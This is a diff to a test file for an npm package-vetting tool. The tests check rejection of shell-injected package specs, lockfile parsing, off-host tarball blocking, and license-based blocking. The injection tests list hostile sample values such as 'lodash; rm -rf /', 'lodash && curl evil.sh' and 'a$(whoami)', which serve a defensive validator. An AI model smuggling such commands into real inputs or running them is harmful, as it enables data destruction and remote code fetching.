@@ -3,6 +3,7 @@ import assert from 'node:assert/strict';
 import {
   assessPackage,
   assertSafeSpec,
+  parseResolvedPackageLock,
   precheck,
   KNOWN_MALICIOUS,
   FRESH_HOURS,
@@ -11,9 +12,19 @@ import {
 const NOW = Date.parse('2026-08-04T12:00:00Z');
 const hoursAgo = (h) => new Date(NOW - h * 36e5).toISOString();
 
-/** Build a packument with one version at a given age, optionally with hooks. */
+/**
+ * Build a packument with one version at a given age, optionally with hooks.
+ * Defaults to an MIT license — real npm packuments almost always declare
+ * one, and tests in this file that aren't about licensing shouldn't have to
+ * think about it. Tests that ARE about licensing use packumentWithLicense.
+ */
 function packument(version, ageHours, scripts = {}) {
-  return { time: { [version]: hoursAgo(ageHours) }, versions: { [version]: { scripts } } };
+  return { time: { [version]: hoursAgo(ageHours) }, versions: { [version]: { scripts, license: 'MIT' } } };
+}
+
+/** Same shape, with a license string attached — the field classifyLicense reads. */
+function packumentWithLicense(version, ageHours, license) {
+  return { time: { [version]: hoursAgo(ageHours) }, versions: { [version]: { license } } };
 }
 
 describe('precheck: spec validation (shell-injection guard)', () => {
@@ -24,9 +35,45 @@ describe('precheck: spec validation (shell-injection guard)', () => {
   });
 
   it('refuses anything with shell metacharacters', () => {
-    for (const s of ['lodash; rm -rf /', 'lodash && curl evil.sh', 'a$(whoami)', 'a`id`', 'a|b', 'a>out']) {
+    for (const s of [
+      'lodash; rm -rf /',
+      'lodash && curl evil.sh',
+      'a$(whoami)',
+      'a`id`',
+      'a|b',
+      'a>out',
+      'left-pad@1 | whoami',
+      'left-pad@1 > owned.txt',
+      'left-pad@1 || calc',
+      'left-pad@1 < input.txt',
+    ]) {
       assert.throws(() => assertSafeSpec(s), /not a valid npm package spec/, s);
     }
+  });
+});
+
+describe('precheck: resolved lock parsing', () => {
+  it('reads direct, scoped, and transitive packages from a lockfile', () => {
+    const packages = parseResolvedPackageLock({
+      packages: {
+        '': { name: 'precheck', version: '1.0.0' },
+        'node_modules/alpha': { version: '1.2.3' },
+        'node_modules/@scope/beta': { version: '4.5.6' },
+        'node_modules/alpha/node_modules/gamma': { version: '7.8.9' },
+      },
+    });
+    assert.deepEqual(packages, [
+      { name: 'alpha', version: '1.2.3' },
+      { name: '@scope/beta', version: '4.5.6' },
+      { name: 'gamma', version: '7.8.9' },
+    ]);
+  });
+
+  it('fails closed when npm resolves no packages', () => {
+    assert.throws(
+      () => parseResolvedPackageLock({ packages: { '': { name: 'precheck', version: '1.0.0' } } }),
+      /result is incomplete/,
+    );
   });
 });
 
@@ -70,9 +117,74 @@ describe('precheck: assessPackage', () => {
   });
 
   it('does not claim a package is fine when the registry gave no date', () => {
-    const r = assessPackage({ name: 'x', version: '1.0.0' }, { time: {}, versions: {} }, NOW);
+    // versions carries a license so this test isolates the age signal specifically —
+    // a missing license is its own (correctly separate) finding, tested above.
+    const r = assessPackage({ name: 'x', version: '1.0.0' }, { time: {}, versions: { '1.0.0': { license: 'MIT' } } }, NOW);
     assert.equal(r.ageHours, null);
     assert.equal(r.level, 'ok', 'unknown age alone is not a finding, but must not fabricate one either');
+  });
+
+  it('BLOCKS metadata that points the artifact at a different host', () => {
+    const p = packument('1.2.3', 5000);
+    p.versions['1.2.3'].dist = {
+      tarball: 'https://copycat.example/pkg-1.2.3.tgz',
+      integrity: 'sha512-safe-looking-value',
+    };
+    const r = assessPackage({ name: 'pkg', version: '1.2.3' }, p, NOW);
+    assert.equal(r.level, 'block');
+    assert.match(r.reasons.join(' '), /untrusted host/);
+  });
+});
+
+describe('precheck: assessPackage license contamination', () => {
+  it('BLOCKS a strong-copyleft package with no permissive escape, same tier as confirmed-malicious', () => {
+    const p = packumentWithLicense('1.0.0', 24 * 400, 'GPL-3.0-or-later');
+    const r = assessPackage({ name: 'copyleft-thing', version: '1.0.0' }, p, NOW);
+    assert.equal(r.level, 'block');
+    assert.match(r.reasons.join(' '), /license: .*strong or network copyleft/);
+  });
+
+  it('BLOCKS AGPL, the one that catches hosted SaaS specifically', () => {
+    const p = packumentWithLicense('1.0.0', 24 * 400, 'AGPL-3.0-only');
+    assert.equal(assessPackage({ name: 'x', version: '1.0.0' }, p, NOW).level, 'block');
+  });
+
+  it('only WARNS on a dual-licensed GPL package — the permissive branch is electable', () => {
+    const p = packumentWithLicense('1.0.0', 24 * 400, '(MIT OR GPL-3.0-or-later)');
+    const r = assessPackage({ name: 'jszip', version: '1.0.0' }, p, NOW);
+    assert.equal(r.level, 'warn');
+  });
+
+  it('only WARNS on weak copyleft (LGPL/MPL) — fine unmodified as a dependency', () => {
+    const p = packumentWithLicense('1.0.0', 24 * 400, 'LGPL-3.0-or-later');
+    assert.equal(assessPackage({ name: 'x', version: '1.0.0' }, p, NOW).level, 'warn');
+  });
+
+  it('does not silently pass an undeclared license', () => {
+    const p = packumentWithLicense('1.0.0', 24 * 400, undefined);
+    const r = assessPackage({ name: 'x', version: '1.0.0' }, p, NOW);
+    assert.equal(r.level, 'warn');
+    assert.match(r.reasons.join(' '), /no license declared/);
+  });
+
+  it('never downgrades a block from the malware checks because the license happens to be clean', () => {
+    const p = { time: { '9.9.9': hoursAgo(2) }, versions: { '9.9.9': { scripts: { postinstall: 'x' }, license: 'MIT' } } };
+    const r = assessPackage({ name: 'anything', version: '9.9.9' }, p, NOW);
+    assert.equal(r.level, 'block', 'hijack signature must still block regardless of license');
+  });
+
+  it('escalates an otherwise-clean package to block on license alone', () => {
+    const p = { time: { '1.0.0': hoursAgo(24 * 400) }, versions: { '1.0.0': { scripts: {}, license: 'GPL-2.0-only' } } };
+    const r = assessPackage({ name: 'clean-but-gpl', version: '1.0.0' }, p, NOW);
+    assert.equal(r.level, 'block');
+    assert.equal(r.installScripts.length, 0, 'no install-script reason, the block is purely the license');
+  });
+
+  it('adds no reason for an ordinary permissive license', () => {
+    const p = packumentWithLicense('1.0.0', 24 * 400, 'MIT');
+    const r = assessPackage({ name: 'x', version: '1.0.0' }, p, NOW);
+    assert.equal(r.level, 'ok');
+    assert.equal(r.reasons.length, 0);
   });
 });
 
@@ -116,6 +228,26 @@ describe('precheck: whole-tree behaviour', () => {
   it('has the real incident versions on the known-bad list', () => {
     for (const v of ['keyv@6.0.0', 'file-entry-cache@11.1.6', 'cacheable-request@13.0.20']) {
       assert.ok(KNOWN_MALICIOUS.has(v), v);
+    }
+  });
+});
+
+describe('precheck: closeAndSetExitCode', () => {
+  it('sets process.exitCode and does not call process.exit', async () => {
+    const { closeAndSetExitCode } = await import('../src/precheck/close-and-exit.js');
+    const prev = process.exitCode;
+    const original = process.exit;
+    let called = false;
+    process.exit = () => {
+      called = true;
+    };
+    try {
+      await closeAndSetExitCode(0);
+      assert.equal(process.exitCode, 0);
+      assert.equal(called, false);
+    } finally {
+      process.exit = original;
+      process.exitCode = prev;
     }
   });
 });
